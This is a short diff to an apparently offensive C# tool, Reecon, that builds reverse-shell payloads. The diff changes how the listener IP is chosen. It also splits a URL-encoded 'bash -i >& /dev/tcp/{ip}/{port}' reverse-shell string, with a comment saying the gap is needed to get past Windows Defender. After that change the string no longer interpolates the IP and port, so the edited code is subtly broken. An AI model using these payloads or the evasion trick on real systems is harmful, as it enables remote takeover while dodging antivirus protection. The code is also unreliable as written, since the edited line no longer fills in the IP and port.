@@ -19,7 +19,7 @@ namespace Reecon
             string shellType = args[1].ToLower(); // NodeJS == nodejs
             // If we have a tun0 IP, use that instead as the default
             List<General.IP> ipList = General.GetIPList();
-            string ip = ipList.Any(x => x.Name == "tun0") ? ipList.FirstOrDefault(x => x.Name == "tun0").Address.ToString() : "10.0.0.1";
+            string ip = ipList.Any(x => x.Name == "tun0") ? ipList.First(x => x.Name == "tun0").Address.ToString() : "10.0.0.1";
             string port = "9001";
             if (args.Length == 2)
             {
@@ -132,7 +132,7 @@ namespace Reecon
             string saferShell = "bash -c \"" + shell + "\"";
             string saferBase64Shell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(saferShell));
             string saferBase64AltShell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(altShell));
-            string saferURLEncodedShell = $"bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22";
+            string saferURLEncodedShell = $"bash%20-c%20%22" + "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22"; // Gap required for Windows Defender
             string toReturn = "#!/bin/bash" + Environment.NewLine +
                                shell + Environment.NewLine +
                                "Note: File header is only required if it's a file and not a command" + Environment.NewLine +
